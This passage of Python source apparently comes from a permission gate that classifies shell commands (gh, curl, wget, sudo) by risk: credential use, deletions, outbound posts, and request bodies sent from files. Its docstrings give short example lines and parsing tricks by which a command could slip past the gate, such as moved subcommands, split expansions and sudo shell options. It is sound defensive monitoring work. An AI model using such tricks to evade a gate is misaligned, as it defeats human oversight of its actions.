    """The indexes of gh api's operands, read with its options that take a value (#399). gh takes one, the
    endpoint."""
    ops: list[int] = []
    _option_values(argv, (), start=2, takes=_GH_API_TAKES, longs=_GH_API_LONGS, least=99, rest=ops)
    return ops


def _gh_api_endpoint(argv: list[str]) -> str:
    """gh api's endpoint: its one operand."""
    ops = _gh_api_operands(argv)
    return argv[ops[0]] if ops else ""


def _gh_api_method(argv: list[str]) -> str:
    """gh api's `-X`/`--method` as pflag reads it: a cluster ends at `X` (`-iX DELETE`, `-iXPUT`), one `=` goes
    (`-X=PUT`), and the last of several stands (round 5 of #399). The gate read the first `-X` word as written
    before, and still does in the line as read before (``floor``), which the line gets when the two differ."""
    before = (_opt(argv, "-X", "--method") or "").upper()
    if _gh_third_word.get():
        return before
    methods = _option_values(argv, ("-X", "--method"), start=2, takes=_GH_API_TAKES, longs=_GH_API_LONGS, least=99,
                             pflag=True)
    method = methods[-1].upper() if methods else ""
    memo = _call_memo.get()
    if method != before and memo is not None:
        memo[_GH_MOVED] = True
    return method


def _gh_api_target(endpoint: str) -> tuple[str, str]:
    """(target, link) of a gh api endpoint: the repo of a `repos/owner/name` path, else a path itself."""
    m = re.search(r"repos/([\w.-]+/[\w.-]+)", endpoint)
    return (m.group(1), f"https://github.com/{m.group(1)}") if m else (endpoint if "/" in endpoint else "", "")


def _gh_target(argv: list[str], dynamic: frozenset = frozenset()) -> tuple[str, str, list[tuple[str, str]]]:
    """(target, link, the other readings) of a gh command (#399). The target comes from `-R` and the operands only,
    read with gh's table of options that take a value (_gh_options), so a URL or a number in a body, a title,
    `--duplicate-of` or `--head` is not the target. A URL operand names the repo even beside `-R`, as in gh.

    Each other reading the gate cannot rule out comes back too, and `decide` keeps the strictest: `-R` when a URL
    operand names another repo, and the reading before #399 (`-R`, then the first URL or number anywhere), so no
    decision drops below what it was. For a command not in the table the gate cannot tell an option's value from
    an operand, so it reads the line with every option a flag and with every option taking a value. The first
    reading gives the target, but a URL operand the second does not find never replaces `-R`.

    gh api's target comes from its endpoint, its one operand. The word the gate took for it before #399, the first
    word with a `/` and no `=` after `api`, an option's value too, is the other reading.

    An operand from an expansion (an index in ``dynamic``) may be a URL for any repo, so the empty target, a repo
    the line does not name, is a reading too. So is an operand that names a repo on another instance
    (_gh_elsewhere)."""
    group, verb = (argv + ["", ""])[1:3]
    if group == "api":
        ops = _gh_api_operands(argv)
        target, link = _gh_api_target(argv[ops[0]] if ops else "")
        old = _gh_api_target(next((a for a in argv[2:] if not a.startswith("-") and "/" in a and "=" not in a), ""))
        return target, link, _gh_others(target, [old] + [("", "")] * any(i in dynamic for i in ops))
    if (group, verb) in _GH_TAKES:
        parses = [_gh_operands(argv, *_gh_options(group, _GH_TAKES[(group, verb)]))]
        sure = set(parses[0][1])
    else:
        longs = tuple(a for a in argv[3:] if a.startswith("--") and len(a) > 2 and "=" not in a)
        parses = [_gh_operands(argv, "", ()), _gh_operands(argv, _GH_ANY_SHORT, longs)]
        sure = set(parses[0][1]) & set(parses[1][1])
    # A `-R` on another instance names a repo the scopes may not mean: its value as written is a reading too.
    raw = [_gh_read(group, r, [argv[i] for i in o], verb=verb) for r, o in parses if r and not _gh_repo(r)[1]]
    parses = [(_gh_repo(r)[0], o) for r, o in parses]
    repo, ops = parses[0]
    target, link = _gh_read(group, repo, [argv[i] for i in ops if i in sure or not (repo and _gh_url(argv[i]))],
                            verb=verb)
    readings = [_gh_read(group, r, [argv[i] for i in o], url, verb=verb)
                for r, o in parses for url in (True, False) if url or r]
    readings += raw + [("", "")] * any(i in dynamic for _, o in parses for i in o)
    readings += [r for _, o in parses for r in _gh_elsewhere(group, verb, [argv[i] for i in o])]
    # Outside the table gh may take some options' values and not others, a mix of the two readings. The words both
    # call operands, with the first one's repo, are such a mix: in `gh pr checkout -b 7 9 -f -R pub/repo` gh checks
    # out pub/repo#9, which neither reading names. In the table there is one reading, and this is it again.
    readings += [_gh_read(group, repo, [argv[i] for i in sorted(sure)], verb=verb),
                 _gh_read(group, _opt(argv, "-R", "--repo") or "", argv[3:], before=True)]     # as before #399
    return target, link, _gh_others(target, readings)


def _gh_others(target: str, readings: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """The (target, link) readings whose target is not ``target``, each target once, in order."""
    alts: dict[str, str] = {}
    for t, url in readings:
        if t != target:
            alts.setdefault(t, url)
    return list(alts.items())


def _gh_text_options(group: str) -> tuple:
    """The options that carry a gh post's text: body (or release notes), its file, and the title."""
    if group == "release":
        return ("--notes", "-n"), ("--notes-file", "-F"), ("--title", "-t")
    return ("--body", "-b"), ("--body-file", "-F"), ("--title", "-t")


def _gh_options(group: str, row: tuple[str, str]) -> tuple[str, tuple]:
    """A gh command's options that take a value, as (short letters, long names): its _GH_TAKES ``row`` and the
    text options, which take a value too: in `--title --body --body x` the title is `--body` and the body `x`."""
    takes, longs = row
    return takes, tuple(longs.split()) + tuple(n for names in _gh_text_options(group) for n in names if n[:2] == "--")


def _gh_unseen(argv: list[str], stdin: str | None, dynamic: frozenset) -> bool:
    """Whether a gh post's text is not all on the line as the gate read it (#208): a word from an expansion
    (any word can be an option, `--body-file=f` included), a text option the gate's reading and gh's disagree
    on (gh takes the last of a repeated option, and short options cluster: `-db text`), a body file `-` with no
    literal stdin, a body gh builds itself (`--fill`, a template, the editor, generated notes), a gist's files,
    or a `gh api` request body or field read from a file (`--input`, `field=@path`)."""
    group, verb = (argv + ["", ""])[1:3]
    if any(i in dynamic for i in range(1, len(argv))) or group == "gist":
        return True
    if group == "api":
        fields = _option_values(argv, _GH_API_FIELDS, takes=_GH_API_TAKES, least=99)
        return _opt(argv, "--input") is not None or any(f.partition("=")[2].startswith("@") for f in fields)
    # Read with the command's row, and with its row before #399 when #399 changed it (_GH_TAKES_BEFORE_399).
    rows = [_GH_TAKES.get((group, verb), ("", ""))] + [r for r in [_GH_TAKES_BEFORE_399.get((group, verb))] if r]
    if verb in ("close", "reopen") and group in ("pr", "issue"):
        # A close or reopen posts its --comment with it (#326, #397): unseen when the gate's read of it and gh's
        # disagree (a repeat, a cluster, an attached form), as for a post's body (#208).
        comment = _opt(argv, "--comment", "-c")
        for takes_c, row in rows:
            values = _option_values(argv, ("--comment", "-c"), takes=takes_c, longs=tuple(row.split()) + ("--comment",),
                                    least=99)
            # No comment: the close or reopen posts nothing but itself.
            if (values or comment is not None) and values != ([] if comment is None else [comment]):
                return True
        return False
    if verb == "merge" and group == "pr":
        # A merge's subject is its title: -t is covered by the generic read below, --subject is not.
        subject = _opt(argv, "--subject", "-t")
        for takes_m, longs_m in rows:
            values = _option_values(argv, ("--subject", "-t"), takes=takes_m,
                                    longs=tuple(longs_m.split()) + ("--subject",), least=99)
            if values != ([] if subject is None else [subject]):
                return True
    body, body_file, title = _gh_text_options(group)
    for takes, longs_all in (_gh_options(group, r) for r in rows):
        for names in (body, body_file, title):
            got = _opt(argv, *names)
            if _option_values(argv, names, takes=takes, longs=longs_all, least=99) != ([] if got is None else [got]):
                return True
    if _opt(argv, *body_file) == "-" and stdin is None:
        return True
    flags = _GH_UNSEEN_FLAGS.get((group, verb), ())
    return _has(argv, *flags) or any(a.startswith(f + "=") for a in argv for f in flags if f.startswith("--"))


# gh commands with subcommands. gh (cobra) finds the subcommand past the options before it.
_GH_VERB_GROUPS = _GH_GROUPS - {"api", "browse", "status", "completion", "help", "version", "--version", "--help"}
# gh's aliases for subcommands (gh 2.89, the ALIASES in each command's --help). Each reads as the one it names.
_GH_ALIASES = {**{(g, "ls"): "list" for g in ("pr", "issue", "repo", "release", "gist", "workflow", "run", "label",
                                              "secret", "variable", "ssh-key", "gpg-key", "project", "cache",
                                              "ruleset", "org", "config")},
               **{(g, "new"): "create" for g in ("pr", "issue", "repo", "release", "gist")},
               ("pr", "co"): "checkout", ("secret", "remove"): "delete", ("variable", "remove"): "delete"}


def _gh_takes_value(word: str, alone: tuple = ("--help",)) -> bool:
    """Whether cobra's stripFlags takes the word after option ``word`` for its value where it looks for a command:
    an option word without `=` that starts with `--` or has two characters, unless it is a boolean flag the
    command knows (``alone``). gh's root knows `--help` and `--version`, a group `--help` (gh 2.89, cobra 1.10)."""
    return "=" not in word and word not in alone and (word.startswith("--") or len(word) == 2)


def _gh_command_at(argv: list[str], dynamic: frozenset, split: frozenset) -> int:
    """The index of gh's command word, past the options before it, as cobra's stripFlags finds it with gh's root
    flags (round 6 of #399): an option word takes the next word as its value by _gh_takes_value, where `--help` and
    `--version` stand alone, any other option word stands alone, an empty word is passed over and `--` ends the
    search. So in `gh -R pub/repo pr comment 5` the command is `pr`, which then reads `-R`. In gh 2.89 `-R` is a
    persistent flag of each group that calls cmdutil.EnableRepoOverride: pr, issue, release, secret, variable, label,
    cache, run, workflow and ruleset, the browse command, gh repo rename, the deploy-key and autolink groups of gh
    repo, and agent-task create and view. gh repo itself has none. A word from an expansion where the command or an
    option may stand is the command word, and so is an option's value that may split into several words
    (``split``, `gh -R $R pr view 5`): gh may run any command there. One that starts with a `-` and has a `=`
    before any expansion (`--repo="$R"`) is an option that stands alone, as it has a `=` whatever bash puts in it,
    unless bash may split it (round 9). len(argv) when there is none."""
    k = 1
    while k < len(argv):
        a = argv[k]
        if k in dynamic and k not in split and re.match(r"-[\w.-]*=", a):
            k += 1
            continue
        if k in dynamic or (a and not a.startswith("-")):
            return k
        if a == "--":
            break
        if a and _gh_takes_value(a, ("--help", "--version")):
            if k + 1 in split:
                return k + 1
            k += 2
        else:
            k += 1
    return len(argv)


def _gh_verb_order(argv: list[str], dynamic: frozenset, split: frozenset = frozenset()) -> list[int] | None:
    """argv's indexes in the order gh reads them, with the command second and the subcommand third (#399). gh
    (cobra) finds the command past the options before it (_gh_command_at), and the subcommand past the options
    before that: an option word takes the next word as its value by _gh_takes_value (`-R owner/name`, `-b text`,
    `-h comment`), `--help` and any other option word stand alone (`-Rowner/name`, `--body=text`, `-`), an empty
    word is passed over, and `--` ends the search. The command and then the subcommand parse every option on the
    line, so `gh pr -b text comment 5` and `gh -b text pr comment 5` are `gh pr comment -b text 5`. None when a
    word from an expansion stands where the subcommand or an option may be, or an option's value before the
    subcommand may split into several words (``split``: an expansion outside quotes, `gh pr -R $R view 5`): the
    gate cannot tell what gh runs. A quoted one (`gh pr -R "$R" comment 5`) is only that value."""
    order = list(range(len(argv)))
    g = _gh_command_at(argv, dynamic, split)
    if 1 < g < len(argv):                    # cobra's stripFlags passes over the options before it
        order = [0, g] + order[1:g] + order[g + 1:]
    if argv[g:g + 1] and argv[g] in _GH_VERB_GROUPS and g not in dynamic:
        i = 2
        while i < len(order) and argv[order[i]] != "--":
            a = argv[order[i]]
            if order[i] in dynamic:
                return None
            if a == "":
                i += 1
                continue
            if not a.startswith("-"):
                return order[:2] + [order[i]] + order[2:i] + order[i + 1:]
            if _gh_takes_value(a):
                if order[i + 1:i + 2] and order[i + 1] in split:
                    return None
                i += 2
            else:
                i += 1
    return order


# Set while classify reads a call's floor: each gh command's third word is its subcommand, and gh api's method its
# first `-X` word as written, as before #399.
_gh_third_word: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_gh_third_word", default=False)
_GH_MOVED = ("gh", "subcommand moved")      # the mark in _call_memo that the call needs a floor


def _classify_gh(argv: list[str], cmd: str, stdin: str | None = None,
                 dynamic: frozenset = frozenset(), split: frozenset = frozenset()) -> Classification:
    """A gh command. ``stdin`` is its stdin when the line spells it out (`_literal_stdin`), ``dynamic`` the
    indexes of words that come from an expansion, ``split`` those of them bash may split into several words or
    none (_gh_splits). An outbound post whose text the gate cannot fully read carries the ``unseen_body`` signal
    (#208). The command and the subcommand are the words gh takes for them (_gh_verb_order), and an alias reads as
    the subcommand it names (_GH_ALIASES). When that is not the second and third word as written, the call also
    gets a floor (classify)."""
    if _gh_third_word.get():
        return _classify_gh_words(argv, cmd, stdin, dynamic)
    order = _gh_verb_order(argv, dynamic, split)
    if order is not None and order[1:2] and order[1] in split:
        # The command's place holds a word bash may split: an option's value (`gh -R $R secret set X`) or an option
        # with its `=` (`gh --repo=$R secret set X`). As one word it is only that option's, and gh secret holds
        # credentials: that reading stands when it gives no grant.
        one = _classify_gh(argv, cmd, stdin, dynamic)
        if one.category in NO_GRANT:
            return one
    words = argv if order is None else [argv[i] for i in order]
    group, verb = (words + ["", ""])[1:3]
    alias = _GH_ALIASES.get((group, verb))
    if order == list(range(len(argv))) and alias is None:
        return _classify_gh_words(argv, cmd, stdin, dynamic)
    memo = _call_memo.get()
    if memo is not None:
        memo[_GH_MOVED] = True
    if order is not None:
        return _classify_gh_words(words[:2] + [alias or words[2]] + words[3:], cmd, stdin,
                                  frozenset(n for n, i in enumerate(order) if i in dynamic))
    # The line as written with its command second, past the empty words and the options before it, as gh passes
    # over them (`gh "" secret "$V"`, `gh -R pub/repo secret "$V"`).
    g = _gh_command_at(argv, dynamic, split)
    lead = [0, g] + [k for k in range(1, g) if argv[k] != "" or k in dynamic] + list(range(g + 1, len(argv)))
    as_written = _classify_gh_words([argv[k] for k in lead], cmd, stdin,
                                    frozenset(n for n, k in enumerate(lead) if k in dynamic))
    if as_written.category in NO_GRANT:
        return as_written                    # gh auth and gh secret hold credentials whatever the subcommand
    return _opaque(f"gh {argv[g]} with a word from an expansion where its subcommand may be", cmd)


def _classify_gh_words(argv: list[str], cmd: str, stdin: str | None, dynamic: frozenset) -> Classification:
    """A gh command whose subcommand is its third word."""
    target, link, alts = _gh_target(argv, dynamic)
    c = _gh_kind(argv, cmd, stdin, target, link)
    gist = c.category == "remote_write" and argv[1:2] == ["gist"]          # a secret gist's create or edit
    gh_close = c.category == "github_close" and (argv + ["", ""])[1:3] in (["pr", "close"], ["issue", "close"])
    if (c.category in OUTBOUND or gist or gh_close or c.category == "vcs_merge") and _gh_unseen(argv, stdin, dynamic):
        c.signals.append("unseen_body")
    # #399: the same action on each other target the gate cannot rule out is a part, and decide keeps the strictest.
    for t, url in alts:
        alt = _gh_kind(argv, cmd, stdin, t, url)
        if alt.target not in [c.target] + c.alt_targets:
            alt.alt_copy = True
            c.parts.append(alt)
            c.alt_targets.append(alt.target)
    return c


def _gh_kind(argv: list[str], cmd: str, stdin: str | None, target: str, link: str) -> Classification:
    group = argv[1] if len(argv) > 1 else ""
    verb = argv[2] if len(argv) > 2 else ""
    if group and group not in _GH_GROUPS:
        return _opaque(f"gh {group} (an alias or extension the gate cannot see)", cmd)
    body_opt, file_opt, title_opt = _gh_text_options(group)
    body = _opt(argv, *body_opt) or ""
    title = _opt(argv, *title_opt) or ""
    body_file = (_opt(argv, *file_opt) or "") if group != "api" else ""
    if body_file == "-":
        body_file = ""
        if stdin is not None and not body:
            body = stdin
    kw = dict(target=target, link=link, text=body, title=title, text_file=body_file, command=cmd)
    where = f" on {target}" if target else ""
    if verb in ("close", "reopen") and group in ("pr", "issue"):
        comment = _opt(argv, "--comment", "-c")  # a close or reopen posts this text with it (#326, #397)
        if comment is not None:
            kw["text"] = comment
    if verb == "merge" and group == "pr":
        subject = _opt(argv, "--subject")  # the merge commit's subject; -t already lands in title
        if subject is not None:
            kw["title"] = subject
    if group == "auth" or group == "secret" or (group == "ssh-key" and verb in ("add", "delete")):
        return _make("credentials", summary=f"gh {group} {verb}", **kw)
    if group == "api":
        method = _gh_api_method(argv)
        # Read as gh reads them, so an attached value (`-fbody=x`) makes it a POST too (#208).
        fields = _option_values(argv, _GH_API_FIELDS, takes=_GH_API_TAKES, least=99)
        if not method:
            method = "POST" if fields or _opt(argv, "--input") else "GET"
        endpoint = _gh_api_endpoint(argv)
        for f in fields:
            k, _, v = f.partition("=")
            if k in ("body", "text", "message") and not v.startswith("@"):
                kw["text"] = v
            elif k == "title":
                kw["title"] = v
        if method == "GET":
            return _make("read", summary=f"gh api GET {endpoint}", **kw)
        if method == "DELETE":
            return _make("delete", exposure="public", summary=f"gh api DELETE {endpoint}", **kw)
        return _make("github_post", summary=f"gh api {method} {endpoint}", **kw)
    if group in ("pr", "issue", "discussion"):
        if verb in ("comment", "review", "create", "edit", "ready", "reopen", "develop", "transfer", "lock", "unlock"):
            label = {"pr": "PR", "issue": "issue", "discussion": "discussion"}[group]
            what = f"{label} {verb}" if verb != "create" else f"new {label}"
            return _make("github_post", summary=f"GitHub {what}{where}", **kw)
        if verb == "merge":
            return _make("vcs_merge", summary=f"merge PR{where}", **kw)
        if verb == "close":
            return _make("github_close", summary=f"close {group}{where}", **kw)
        if verb == "delete":
            return _make("delete", exposure="public", third_party=True, summary=f"delete {group}{where}", **kw)
        return _make("read", summary=f"gh {group} {verb}", **kw)
    if group == "release":
        if verb in ("create", "edit", "upload"):
            return _make("publish", summary=f"GitHub release {verb}{where}", **kw)
        if verb == "delete" or verb == "delete-asset":
            return _make("delete", exposure="public", summary=f"delete release{where}", **kw)
        return _make("read", summary=f"gh release {verb}", **kw)
    if group == "repo":
        if verb == "delete":
            return _make("delete", exposure="public", summary=f"delete repo{where}", **kw)
        if verb == "archive":
            return _make("github_close", summary=f"archive repo{where}", **kw)
        if (verb == "create" and "--public" in argv) or (verb == "edit" and _opt(argv, "--visibility") == "public"):
            return _make("publish", summary=f"make a public repo{where}", **kw)
        if verb in ("create", "edit", "rename", "fork"):
            return _make("vcs_admin", summary=f"gh repo {verb}{where}", **kw)
        return _make("read", summary=f"gh repo {verb}", **kw)
    if group == "gist" and verb in ("create", "edit"):
        exposure = "public" if "--public" in argv or "-p" in argv else "internal"
        return _make("publish" if exposure == "public" else "remote_write", exposure=exposure,
                     summary=f"gist {verb}", **kw)
    if group == "workflow" and verb in ("run", "enable", "disable"):
        return _make("remote_write", summary=f"gh workflow {verb}", **kw)
    if group in ("label", "variable", "ruleset", "cache") and verb in ("create", "edit", "delete", "set", "clone"):
        return _make("vcs_admin", summary=f"gh {group} {verb}", **kw)
    return _make("read", summary=f"gh {group} {verb}".strip(), **kw)


def _http_unseen(prog: str, argv: list[str], dynamic: frozenset, fed: bool) -> bool:
    """Whether an HTTP client's request body is not all on the line (#208): a word from an expansion other than
    a header or login value, a body read from a file or stdin (curl `-d @f`, `-F k=@f`, `-F k=<f`, `-T`, `-K`;
    wget `--post-file`; httpie `k=@f`, `k:=@f`, `k@f` or a fed stdin)."""
    meta = _HTTP_META.get(prog, ())
    exempt = {i + 1 for i, a in enumerate(argv) if a in meta}
    exempt |= {i for i, a in enumerate(argv) if any(a.startswith(m + "=") for m in meta if m.startswith("--"))}
    if any(i in dynamic and i not in exempt for i in range(1, len(argv))):
        return True
    if prog == "curl":
        values = lambda *names: _option_values(argv, names, least=99)  # noqa: E731
        return bool(values("-T", "--upload-file") or values("-K", "--config") or values("--expand-data")
                    or any(v.startswith("@") for v in values("-d", "--data", "--data-binary", "--data-ascii", "--json"))
                    or any(re.match(r"[^=]*@", v) for v in values("--data-urlencode"))
                    or any(re.match(r"[^=]*=[@<]", v) for v in values("-F", "--form")))
    if prog == "wget":
        return _opt(argv, "--post-file", "--body-file", "--config", "--execute", "-e") is not None
    return (fed and not _has(argv, "--ignore-stdin", "-I")) or any(re.match(r"[\w.-]+(=@|:=@|@)", a) for a in argv[1:])


def _classify_http(argv: list[str], cmd: str, dynamic: frozenset = frozenset(), fed: bool = False) -> Classification:
    """curl, wget or httpie. A post whose body the gate cannot fully read carries ``unseen_body`` (#208)."""
    c = _http_kind(argv, cmd)
    if c.category == "web_post" and _http_unseen(argv[0], argv, dynamic, fed):
        c.signals.append("unseen_body")
    return c


def _http_kind(argv: list[str], cmd: str) -> Classification:
    prog = argv[0]
    urls = [a for a in argv[1:] if _URL.match(a)]
    if not urls:
        urls = [a for a in argv[1:] if not a.startswith("-") and "=" not in a
                and ("." in a or re.match(r"(localhost|\[::1\])(:\d+)?(/|$)", a))][:1]
    url = urls[0] if urls else ""
    host = _host_of(url) if url else ""
    method, data = "GET", ""
    # curl -K reads options, data and URLs from a file the gate does not read: a request it cannot see (#208).
    config = prog == "curl" and bool(_option_values(argv, ("-K", "--config"), least=99))
    if prog == "curl":
        method = (_opt(argv, "-X", "--request") or "").upper()
        datas = _option_values(argv, _DATA_FLAGS, least=99)   # an attached value (`-d@f`) is a POST too (#208)
        data = " ".join(datas)
        if not method:
            method = "POST" if datas or _has(argv, "-T", "--upload-file") else "GET"
        if _has(argv, "-I", "--head"):
            method = "HEAD"
        if config and method in ("GET", "HEAD", "OPTIONS"):
            method = "POST"
    elif prog == "wget":
        method = (_opt(argv, "--method") or "").upper() or ("POST" if _opt(argv, "--post-data", "--post-file") else "GET")
        data = _opt(argv, "--post-data") or ""
    elif prog in ("http", "https", "xh", "httpie"):
        m = next((a.upper() for a in argv[1:3] if a.upper() in ("GET", "POST", "PUT", "PATCH", "DELETE")), "")
        fields = [a for a in argv[1:] if re.match(r"^[\w.-]+(:=|=|@)", a)]
        method = m or ("POST" if fields else "GET")
        data = " ".join(fields)
    kw = dict(target=host, link=url, command=cmd, text=data)
    if method in ("GET", "HEAD", "OPTIONS"):
        return _make("web_read", summary=f"{method} {host or url}", **kw)
    if host and _is_local_host(host) and not config:   # a host the gate cannot read is not local (#208)
        return _make("local_write", summary=f"{method} to local service {host or url}", **kw)
    return _make("web_post", summary=f"{method} to {host}", **kw)


def _prefix_assign(w: "_Word", own_argv: bool, quoted_value: bool) -> bool:
    """Whether the prefix word ``w`` is an assignment: its NAME= unquoted in the source, only the value quoted (#471),
    while ``quoted_value`` (not in the reading as before #471, where a quoted word is the program); and any word of
    the form NAME=VALUE in env's or sudo's own argv (``own_argv``). A line continuation in the name is no quoting:
    bash drops it first. _strip_prefix_words and _env_split_lines (#591) read the prefixes alike."""
    return bool(_ASSIGN.fullmatch(w.text)) and (own_argv or not w.quoted or quoted_value and bool(_ASSIGN_HEAD.match(
        re.sub(r"(?<!\\)((?:\\\\)*)\\\n", r"\1", w.raw))))


def _strip_prefix_words(words: list, quoted_value: bool | None = None,
                        sudos: list | None = None) -> tuple[list, bool, str | None]:
    """Drop assignments and prefix commands (sudo, env, timeout...). Returns (words, sudo, env -S text).
    A word is an assignment when its NAME= is unquoted in the source; only the value may be quoted, so
    `X='a b' cmd` runs cmd and `'X=a' cmd` runs `X=a` (#471). With quoted_value False (by default while
    classify reads a call as before, _as_before), any quoted word is the program, as before #471. env and
    sudo read NAME=VALUE from their own argv, so after them a quoted one is an assignment too.
    ``sudos`` gets (program, the words, the index there of the word after it) for each sudo or doas met (#491,
    _sudo_shells). It walks the words by index: a chain of prefixes costs one pass, not one copy per word."""
    if quoted_value is None:
        quoted_value = not _as_before.get()
    sudo = own_argv = False
    i, n = 0, len(words)
    while i < n:
        t = words[i].text
        if _prefix_assign(words[i], own_argv, quoted_value):
            if words[i].quoted and not own_argv and (seen := _quoted_seen.get()) is not None:
                seen[0] = True
            i += 1
            continue
        base = t.rsplit("/", 1)[-1]
        if words[i].dynamic or base not in _PREFIXES:
            break
        if base == "command" and i + 1 < n and words[i + 1].text in ("-v", "-V"):
            break
        if sudos is not None and base in ("sudo", "doas"):
            sudos.append((base, words, i + 1))
        sudo = sudo or base in ("sudo", "doas")
        own_argv = base in ("env", "sudo")
        takes, i = _PREFIXES[base], i + 1
        while i < n and words[i].text.startswith("-") and words[i].text != "-":
            f = words[i].text
            i += 1
            if base == "env" and (f in ("-S", "--split-string") or f.startswith(("--split-string=", "-S"))):
                inline = f.split("=", 1)[1] if "=" in f else (f[2:] if f.startswith("-S") and len(f) > 2 else "")
                return [], sudo, inline or " ".join(w.text for w in words[i:])
            if f in takes and i < n:
                i += 1
        if base == "timeout" and i < n and re.fullmatch(r"[\d.]+[smhd]?", words[i].text):
            i += 1
    return words[i:], sudo, None


# sudo's and doas's own options (sudo 1.9 `sudo -h` and parse_args.c, OpenBSD doas.c): the short ones that take a
# value, and sudo's long ones, those that take a value marked with `=` (--preserve-env takes one only after `=`).
_SUDO_VALUES = {"sudo": "aCcDgpRrTtUu", "doas": "aCu"}
_SUDO_LONG = ("askpass", "auth-type=", "background", "bell", "close-from=", "login-class=", "chdir=", "preserve-env",
              "edit", "group=", "set-home", "help", "host=", "login", "remove-timestamp", "reset-timestamp", "list",
              "non-interactive", "no-update", "preserve-groups", "prompt=", "chroot=", "role=", "stdin", "shell",
              "type=", "command-timeout=", "other-user=", "user=", "version", "validate")


_sudo_shell_off: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_sudo_shell_off", default=False)
_SUDO_READ = ("sudo", "shell read")          # the mark in _call_memo that _read_core reads the call as before #491 too


def _sudo_unread(prog: str, w: _Word) -> bool:
    """Whether a word in sudo's or doas's options may come to options the gate cannot read (#491): an operand that
    may expand to one (`"$X"`, `?s`, `{-s,}`, `~-` or `~-{,}`, $OLDPWD), or an option word with an expansion or an
    unquoted glob that may make several words, or that comes before any letter or `=` taking a value (`-$X`, `-?`,
    `-E"$X"`; not `-u"$U"` or `--user="$U"`, whose expansion is the value, one word)."""
    f = w.text
    if not f.startswith("-"):
        # bash expands braces before tildes: `~-{,}` is `~- ~-`, each $OLDPWD
        return (w.dynamic or _expands(w) or w.raw[:1] == "[" and "]" in f) and f[:1] in "$`*?[{" or \
            w.raw[:1] == "~" and any(re.fullmatch(r"~[-+]\d*", x) for x in _brace_words(w.raw, keep=True) or ["~-"])
    if not (w.dynamic or w.glob):
        return False
    if _gh_splits(w):
        return True
    at = min([f.find(c, 1) for c in "$`*?[{" if c in f[1:]] or [len(f)])
    if f.startswith("--"):
        return "=" not in f[:at]
    return not any(ch in _SUDO_VALUES[prog] or ch == "h" and prog == "sudo" for ch in f[1:at])


def _sudo_splits(v: _Word) -> bool:
    """Whether bash may make several words of a sudo option's value (#491): _gh_splits, or a bracket glob at its
    start, which the lexer does not mark (`-u [!a]s`)."""
    return _gh_splits(v) or v.raw[:1] == "[" and "]" in v.text


_SUDO_BRANCHES = 16     # the readings per call of a word that may take the next word as its value (_sudo_read)
# how the summary of a part a cap left unread ends (_too_deep, a sudo past _SUDO_BRANCHES): _a_cap
_CAP_ENDS = ("nested too deep to read", "levels deep, not read", "next word than the gate reads")


def _sudo_read(prog: str, words: list, i: int, shell: str, unsure: bool, left: list[int],
               splice: bool = True) -> list[tuple]:
    """The readings of one sudo's or doas's options from words[i] (_sudo_shells), as getopt reads them: each is
    (the shell option or "", a list and the index there its command starts at, whether it only may, and how it was
    read: "as written", "moved" when a brace value's words moved where the options end, "may" when a word took the
    next one as its value, "past" past the call's budget ``left``). The first takes each word as written. A word
    the gate cannot read (_sudo_unread) and a value that may split (_sudo_splits) may also end in a letter that
    takes the next word as its value (`-$X echo` may be `-p echo`, `-u $U echo` may be `-u root -p echo`): a "may"
    reading follows. ``splice`` False reads a brace value as one word, to tell whether its words moved anything; a
    reading whose command they moved counts against the budget, with a shell option or not."""
    out: list[tuple] = []
    moved, first = False, (words, i, shell, unsure)

    def then(j: int) -> list[tuple]:     # the reading where the word before words[j] took words[j] as its value
        if j >= len(words):
            return []
        if left[0] <= 0:
            return [(shell, words, len(words), True, "past")]
        left[0] -= 1
        return [(s, r, at, True, how if how == "past" else "may")
                for s, r, at, _, how in _sudo_read(prog, words, j + 1, shell, True, left)]

    while i < len(words) and words[i].text != "-" and (words[i].text.startswith("-") or
                                                       _sudo_unread(prog, words[i])):
        f, i = words[i].text, i + 1
        if f == "--":
            break
        if _sudo_unread(prog, words[i - 1]):
            shell, unsure = shell or f, True
            out += then(i)
            continue
        takes = False
        if f.startswith("--"):
            name, eq, _ = f[2:].partition("=")
            hits = ([o for o in _SUDO_LONG if o.rstrip("=") == name] or
                    [o for o in _SUDO_LONG if o.startswith(name)]) if prog == "sudo" else []
            shell = shell or next((f for o in hits if o in ("shell", "login")), "")
            takes = len(hits) == 1 and hits[0].endswith("=") and not eq
        for j, ch in enumerate(f[1:] if not f.startswith("--") else "", 2):
            shell = shell or (f if ch == "s" or ch == "i" and prog == "sudo" else "")
            if ch in _SUDO_VALUES[prog] or ch == "h" and prog == "sudo":
                takes = j == len(f) and not (ch == "h" and i < len(words) and words[i].text.startswith("-"))
                break
        if not takes or i == len(words):
            continue
        v = words[i]
        if splice and v.brace and _gh_splits(v) and not v.dynamic:
            # bash keeps a word the set makes twice (`{-s,-s}` is `-s -s`), so the words are not deduplicated
            alts = (_brace_words(v.raw.replace("\\\n", ""), keep=True) or [])[1:]
            ws = [x for c in _parse(" ".join(alts))[0] for x in c.words]
            if ws and len(ws) == len([a for a in alts if a]):
                words, v, moved = words[:i] + ws + words[i + 1:], ws[0], moved or len(ws) > 1
        if _sudo_splits(v):
            shell, unsure = shell or v.text, True
            out += then(i + 1)
        i += 1
    while prog == "sudo" and i < len(words) and _ASSIGN.fullmatch(words[i].text):
        i += 1
    if moved:                             # its command is read as well, where it starts elsewhere
        _, was, at, _, _ = _sudo_read(prog, *first, [0], False)[0]
        if len(was) - at == len(words) - i and (i == len(words) or was[at] is words[i]):
            moved = False
        elif left[0] <= 0:                # the call's budget counts it
            return [(shell, words, len(words), True, "past")] + out
        else:
            left[0] -= 1
    return [(shell, words, i, unsure, "moved" if moved else "as written")] + out


def _sudo_shells(sudos: list, fed: bool = False) -> list[tuple[int, str, list, int, bool, str]]:
    """For each sudo or doas in ``sudos`` (_strip_prefix_words), its index there and each reading of its options
    (_sudo_read) that starts the target user's shell (sudo -s, -i, --shell, --login, doas -s: #491) or that moves
    where its command starts: the option that does ("" for none), a list and the index there the words of its
    command start at, whether it only may, and how it was read. Options are read as getopt reads them: clustered
    (`-Es`, `-iu root`), `--user=root` or `--user root`, a unique prefix of a long one, up to `--` or the first
    operand, and the NAME=VALUE words sudo takes for the environment after them. sudo's -h takes the next word as
    its host when that is no option. An ambiguous long option counts as a shell option if it may be one (getopt
    then stops sudo). So does a word the gate cannot read that may come to one (_sudo_unread), and an option's
